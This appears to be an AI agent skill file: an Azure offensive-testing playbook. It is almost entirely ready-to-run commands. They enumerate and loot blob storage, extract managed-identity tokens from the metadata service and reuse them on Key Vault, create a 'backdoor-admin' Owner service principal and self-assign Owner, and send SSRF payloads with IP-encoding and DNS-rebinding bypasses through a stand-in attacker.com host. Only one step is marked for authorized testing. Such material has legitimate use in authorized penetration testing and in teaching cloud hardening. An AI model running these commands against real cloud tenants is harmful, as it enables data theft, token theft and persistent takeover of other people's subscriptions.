---
name: azure-security
description: Azure security testing - Blob storage misconfigurations, IAM privilege escalation, managed identity attacks, metadata service exploitation
---

# Azure Security Testing

## Azure Blob Storage Enumeration

### Discover Blob Storage Accounts
```bash
# Install Azure CLI
curl -L https://aka.ms/InstallAzureCli | bash
az login

# List storage accounts (if authenticated)
az storage account list

# Brute force storage account names
# Pattern: accountname.blob.core.windows.net
for account in targetbackup targetdata targetlogs targetassets; do
  curl -I https://$account.blob.core.windows.net 2>/dev/null | grep -E "HTTP|x-ms"
done

# Use tools like MicroBurst
# https://github.com/NetSPI/MicroBurst
Import-Module .\MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target
```

### Test for Public Access
```bash
# Check if container is publicly accessible
curl -s https://accountname.blob.core.windows.net/container-name?restype=container&comp=list

# Check specific blobs
curl -I https://accountname.blob.core.windows.net/container-name/sensitive-file.txt

# List blobs in public container
curl -s "https://accountname.blob.core.windows.net/container-name?restype=container&comp=list" | grep -o "<Name>[^<]*</Name>"

# Test for public write (authorized testing only)
echo "test" > test.txt
az storage blob upload --account-name accountname --container-name container-name --file test.txt --name test.txt
```

### Blob Storage Misconfigurations

**Public Container Access**
```bash
# List all blobs in public container
az storage blob list --account-name accountname --container-name container-name --output table

# Download sensitive files
az storage blob download --account-name accountname --container-name container-name --name config.json --file config.json
az storage blob download --account-name accountname --container-name container-name --name backup.sql --file backup.sql

# Use curl for unauthenticated access
curl -s "https://accountname.blob.core.windows.net/container-name/config.json"
```

**Anonymous Access Policy**
```bash
# Check container access level
az storage container show-permission --account-name accountname --name container-name

# Look for:
# - "blob" - public read access for blobs only
# - "container" - public read and list access

# Get container properties
curl -I "https://accountname.blob.core.windows.net/container-name?restype=container"
# Check x-ms-blob-public-access header
```

**Shared Access Signatures (SAS)**
```bash
# If you find a SAS token in source code or logs
# Example: ?sv=2020-08-04&ss=b&srt=sco&sp=rwdlacupitfx&se=2023-12-31&st=2023-01-01&spr=https&sig=...

# Use SAS token to access blobs
curl -s "https://accountname.blob.core.windows.net/container-name/file.txt?sv=2020-08-04&ss=b&srt=sco&sp=rwdlacupitfx&se=2023-12-31&st=2023-01-01&spr=https&sig=..."

# Check SAS permissions
# sp=r (read), w (write), d (delete), l (list), a (add), c (create), u (update), p (process)
# Look for overly permissive SAS tokens (rwdlacup = full access)
```

### Blob Storage Data Exfiltration

**Sensitive Data Discovery**
```bash
# Search for sensitive patterns
az storage blob list --account-name accountname --container-name container-name --output json | jq -r '.[].name' | grep -iE "(password|secret|key|token|credential|backup|dump|config)"

# Download and search contents
az storage blob download-batch --account-name accountname --source container-name --destination ./blob-data/
grep -r "password\|secret\|api_key\|token\|BEGIN RSA" ./blob-data/
```

**Blob Versioning & Soft Delete**
```bash
# List blob versions (if versioning enabled)
az storage blob list --account-name accountname --container-name container-name --include v --output json

# List soft-deleted blobs
az storage blob list --account-name accountname --container-name container-name --include d --output json

# Restore soft-deleted blob
az storage blob undelete --account-name accountname --container-name container-name --name deleted-file.txt

# Download specific version
az storage blob download --account-name accountname --container-name container-name --name file.txt --version-id VERSION_ID --file file.txt
```

## Azure IAM & Managed Identity

### Service Principal Enumeration
```bash
# List service principals
az ad sp list --output table

# Get service principal details
az ad sp show --id SERVICE_PRINCIPAL_ID

# List service principal credentials
az ad sp credential list --id SERVICE_PRINCIPAL_ID

# Get role assignments
az role assignment list --assignee SERVICE_PRINCIPAL_ID
```

### Managed Identity Attacks

**System-Assigned Managed Identity**
```bash
# If you have shell access to Azure VM/App Service/Function
# Access IMDS (Instance Metadata Service)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Response includes access token:
# {
#   "access_token": "eyJ0eXA...",
#   "expires_in": "86399",
#   "token_type": "Bearer"
# }

# Use the token
export TOKEN="eyJ0eXA..."
curl -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01
```

**User-Assigned Managed Identity**
```bash
# List user-assigned identities
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=CLIENT_ID"

# Get identity details
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq '.compute.identity'
```

### IAM Privilege Escalation

**Create New Service Principal with Owner Role**
```bash
# If you have Microsoft.Authorization/roleAssignments/write permission
az ad sp create-for-rbac --name backdoor-admin --role Owner --scopes /subscriptions/SUBSCRIPTION_ID

# Output includes password and app ID
# {
#   "appId": "...",
#   "password": "...",
#   "tenant": "..."
# }

# Login with new service principal
az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID
```

**Assign Role to Yourself**
```bash
# If you have Microsoft.Authorization/roleAssignments/write permission
az role assignment create \
  --assignee YOUR_EMAIL \
  --role Owner \
  --scope /subscriptions/SUBSCRIPTION_ID

# Or assign to service principal
az role assignment create \
  --assignee SERVICE_PRINCIPAL_ID \
  --role Contributor \
  --scope /subscriptions/SUBSCRIPTION_ID
```

**Deploy ARM Template with Elevated Permissions**
```bash
# If you have Microsoft.Resources/deployments/write permission
cat > template.json << 'EOF'
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Authorization/roleAssignments",
      "apiVersion": "2020-04-01-preview",
      "name": "[guid(resourceGroup().id)]",
      "properties": {
        "roleDefinitionId": "[concat('/subscriptions/', subscription().subscriptionId, '/providers/Microsoft.Authorization/roleDefinitions/', '8e3af657-a8ff-443c-a75c-2fe8c4bcb635')]",
        "principalId": "YOUR_OBJECT_ID"
      }
    }
  ]
}
EOF

az deployment group create \
  --resource-group RESOURCE_GROUP \
  --template-file template.json
```

## Azure Instance Metadata Service (IMDS)

### IMDS Access
```bash
# If you have SSRF or shell access to Azure VM/App Service
# Access IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get all metadata
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

# Get specific data
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text"

curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text"
```

### IMDS Token Extraction
```bash
# Get access token for Azure Resource Manager
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get access token for Azure Storage
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Get access token for Azure Key Vault
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

### SSRF to IMDS
```bash
# Test for SSRF vulnerabilities
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

# Bypass techniques
# URL encoding
curl "https://target.com/fetch?url=http://169.254.169.254%2Fmetadata%2Finstance%3Fapi-version%3D2021-02-01"

# IP address variations
curl "https://target.com/fetch?url=http://2852545886/metadata/instance?api-version=2021-02-01"
curl "https://target.com/fetch?url=http://0xA9FEA9FE/metadata/instance?api-version=2021-02-01"

# DNS rebinding
# Create DNS record: metadata.attacker.com -> 169.254.169.254
curl "https://target.com/fetch?url=http://metadata.attacker.com/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
```

## Azure Key Vault Attacks

### Key Vault Enumeration
```bash
# List key vaults
az keyvault list

# Get key vault details
az keyvault show --name VAULT_NAME

# List secrets
az keyvault secret list --vault-name VAULT_NAME

# List keys
az keyvault key list --vault-name VAULT_NAME

# List certificates
az keyvault certificate list --vault-name VAULT_NAME
```

### Key Vault Access
```bash
# If you have access policy permissions
# Get secret value
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME

# Get key
az keyvault key show --vault-name VAULT_NAME --name KEY_NAME

# Download certificate
az keyvault certificate download --vault-name VAULT_NAME --name CERT_NAME --file cert.pem

# Use managed identity to access Key Vault
export TOKEN=$(curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r '.access_token')

curl -H "Authorization: Bearer $TOKEN" \
  "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.2"
```

## Testing Checklist

- [ ] Enumerate Azure Blob storage accounts
- [ ] Test blob containers for public access
- [ ] Check container access levels (blob, container, private)
- [ ] Search for overly permissive SAS tokens
- [ ] Search blob storage for sensitive data
- [ ] Test blob versioning and soft delete
- [ ] Enumerate service principals and managed identities
- [ ] Test for managed identity token extraction via IMDS
- [ ] Test IAM privilege escalation paths
- [ ] Test for role assignment abuse
- [ ] Test Azure IMDS access (from VMs/App Services)
- [ ] Test for SSRF to IMDS
- [ ] Extract access tokens from IMDS
- [ ] Enumerate Azure Key Vaults
- [ ] Test Key Vault access via managed identity
- [ ] Check for public Azure endpoints (SQL, Storage, etc.)

## Tools

```bash
# Azure CLI
curl -L https://aka.ms/InstallAzureCli | bash

# MicroBurst (PowerShell)
# https://github.com/NetSPI/MicroBurst

# AzureHound (BloodHound for Azure)
# https://github.com/BloodHoundAD/AzureHound

# ROADtools (Azure AD exploration)
# https://github.com/dirkjanm/ROADtools

# Nuclei templates for Azure
nuclei -u https://target.com -t ~/nuclei-templates/misconfiguration/azure/
```

## Real-World Impact

**Case 1: Public Blob Container with Database Backup**
- Container: company-backup (public access)
- Contents: SQL database backup with customer PII
- Impact: Data breach, regulatory fines

**Case 2: Managed Identity Privilege Escalation**
- Initial: App Service with Contributor role
- Escalation: Created new role assignment for Owner
- Impact: Full subscription compromise

**Case 3: IMDS Token Extraction via SSRF**
- Vulnerability: SSRF in web application on Azure VM
- Exploitation: Extracted managed identity token from IMDS
- Impact: Accessed Key Vault secrets and Storage Account with managed identity permissions
